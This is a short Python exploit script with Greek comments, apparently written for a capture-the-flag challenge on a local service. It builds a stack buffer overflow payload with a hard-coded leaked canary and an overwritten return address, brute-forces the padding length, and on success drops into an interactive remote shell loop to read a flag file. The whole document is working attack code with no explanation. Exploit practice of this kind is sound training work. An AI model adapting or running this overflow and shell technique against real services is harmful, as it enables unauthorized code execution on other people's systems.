import socket
import time

host, port = '127.0.0.1', 28285
canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
addr = b"\x26\x92\x04\x08"

# Δοκιμάζουμε ένα εύρος γύρω από το 28 που βρήκες τοπικά
for junk in range(8, 41, 4):
    print(f"[*] Trying junk size: {junk}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((host, port))
        
        # Στέλνουμε το payload + μια εντολή ls αμέσως μετά
        payload = b"A" * 122 + canary + b"A" * junk + addr + b"\n"
        s.sendall(payload)
        
        # Δίνουμε λίγο χρόνο στον server να επεξεργαστεί το shell
        time.sleep(0.1)
        s.sendall(b"ls\n")
        
        response = s.recv(4096)
        if len(response) > 0 and b"Twit" not in response:
            print(f"\n[!!!] SHELL FOUND AT JUNK {junk}!")
            print(response.decode(errors='ignore'))
            # Κράτα τη σύνδεση για να γράψεις cat flag.txt
            while True:
                cmd = input("$ ")
                s.sendall(cmd.encode() + b"\n")
                print(s.recv(4096).decode())
    except:
        continue
    finally:
        s.close()